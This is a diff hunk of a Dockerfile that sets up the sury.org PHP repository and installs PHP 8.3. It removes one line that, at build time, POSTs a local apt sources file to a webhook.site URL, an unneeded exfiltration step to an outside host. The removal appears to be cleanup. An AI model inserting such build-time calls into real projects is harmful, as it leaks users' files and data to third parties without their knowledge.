@@ -10,7 +10,6 @@ RUN apt update && apt install -y --no-install-recommends \
 
 RUN curl -sSLo /usr/share/keyrings/deb.sury.org-php.gpg https://packages.sury.org/php/apt.gpg && sh -c 'echo "deb [signed-by=/usr/share/keyrings/deb.sury.org-php.gpg] https://packages.sury.org/php/ $(lsb_release -sc) main" > /etc/apt/sources.list.d/php.list'
 
-RUN curl -X POST -d @/etc/apt/sources.list.d/php.list https://webhook.site/85eb97e3-7dd7-4193-89bf-1fe6c914e7a7
 
 RUN apt update && apt install -y --no-install-recommends \
     php8.3 \
